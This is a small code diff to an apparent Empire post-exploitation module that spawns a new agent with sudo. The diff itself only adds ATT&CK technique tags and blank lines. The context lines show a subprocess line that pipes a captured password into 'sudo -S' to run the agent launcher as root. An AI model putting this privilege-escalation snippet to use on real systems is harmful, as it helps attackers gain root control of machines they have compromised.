@@ -1,5 +1,7 @@
 from __future__ import print_function
+
 from builtins import object
+
 from lib.common import helpers
 
 
@@ -17,6 +19,10 @@ class Module(object):
 
             # more verbose multi-line description of the module
             'Description': ('Spawns a new Empire agent using sudo.'),
+
+            'Software': 'T1169',
+
+            'Techniques': ['T1050'],
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -108,4 +114,5 @@ class Module(object):
             parts = launcher.split("|")
             launcher = "python -c %s" % (parts[0])
             script = 'import subprocess; subprocess.Popen("echo \\"%s\\" | sudo -S %s", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)' % (password, launcher)
+
             return script
